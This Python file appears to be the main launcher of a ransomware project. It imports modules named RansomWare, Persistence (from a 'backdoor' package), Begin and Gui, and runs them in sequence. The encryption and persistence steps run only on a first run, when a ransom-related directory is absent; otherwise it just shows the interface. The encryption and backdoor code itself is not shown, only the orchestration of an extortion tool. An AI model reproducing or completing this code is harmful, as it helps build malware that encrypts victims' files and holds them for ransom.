# Import
from os.path import isdir
# Local import
from Start.start import Begin
from encryption.encrypt import RansomWare
from GUI.main_gui import Gui
from persistence.backdoor import Persistence
from const import *


if __name__ == "__main__":
    
    if not isdir(PATH_RANCON):
        step1 = Begin()
        step2 = Persistence()
        step3 = RansomWare()
        step4 = Gui()
    else:
        step4 = Gui()

